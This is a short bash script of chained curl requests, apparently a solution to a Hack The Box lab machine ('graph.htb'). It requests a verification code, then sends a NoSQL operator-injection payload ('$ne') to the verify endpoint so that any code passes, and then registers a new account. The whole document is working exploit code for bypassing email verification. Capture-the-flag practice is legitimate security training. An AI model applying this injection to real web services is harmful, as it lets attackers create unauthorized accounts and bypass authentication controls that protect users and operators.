#!/bin/bash

curl -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\"}' \
    $'http://internal-api.graph.htb/api/code' \
    --next -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\",\"code\":{\"$ne\":\"1234\"}}' \
    $'http://internal-api.graph.htb/api/verify' \
    --next -i -s -k -X $'POST' \
    -H $'Host: internal-api.graph.htb' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"email\":\"apehex@graph.htb\",\"password\":\"heyhey\",\"confirmPassword\":\"heyhey\",\"username\":\"apehex\"}' \
    $'http://internal-api.graph.htb/api/register'
